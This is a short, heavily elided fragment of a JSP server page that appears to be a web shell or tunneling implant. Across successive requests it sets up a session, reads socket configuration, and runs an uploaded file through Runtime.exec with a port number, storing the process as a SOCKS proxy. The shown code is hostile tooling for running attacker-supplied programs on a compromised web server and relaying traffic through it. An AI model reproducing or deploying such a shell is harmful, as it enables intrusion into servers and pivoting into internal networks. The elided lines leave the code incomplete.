<%@ page import="java.io.*, java.net.*, java.nio.*, java.nio.channels.*,java.net.Socket" trimDirectiveWhitespaces="true" %>
<%!
//
	...
	if(session.isNew()){							//1st request: initiate session
		...
		if (session.getAttribute("running") == "0" ){	//2nd request: get configuration options for socket
			...
			if (session.getAttribute("file") != null){
				...
				try{  //Execute file
					Runtime r = Runtime.getRuntime();
					Process p = r.exec(new String[] { s, Integer.toString(port)});
					session.setAttribute("SocksProcess",p);
				} catch(Exception e2)
				{  
					os.write(e2.getMessage().getBytes());
					os.flush();
					os.close();
					return;
				}
